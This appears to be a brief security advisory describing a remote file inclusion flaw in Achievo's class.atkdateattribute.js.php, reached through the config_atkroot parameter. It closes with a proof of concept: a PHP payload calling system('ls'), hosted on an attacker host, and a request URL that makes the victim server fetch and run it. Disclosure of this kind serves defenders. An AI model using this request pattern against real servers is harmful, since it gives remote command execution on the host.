Achievo includes a PHP script which is used to generate JavaScript (class.atkdateattribute.js.php). This script employs a number of PHP include_once() statements to call code contained in function libraries and grab configuration information. Attackers may subvert the variable ($config_atkroot) which is used to store the location of the external files and specify an arbitrary location, such as an attacker-supplied PHP script on a remote host.

Exploitation of this issue will enable the remote attacker to execute commands with the privileges of the webserver hosting the vulnerable software.


Create the following text file (ls.txt) and store it on the attacker host where it is publicly accessible:

<?php system('ls'); ?>

And cause the vulnerable script on the victim host to invoke it with the following request:

http://victimhost/achievo/atk/javascript/class.atkdateattribute.js.php?config_atkroot=http://attackerhost/ls.txt?
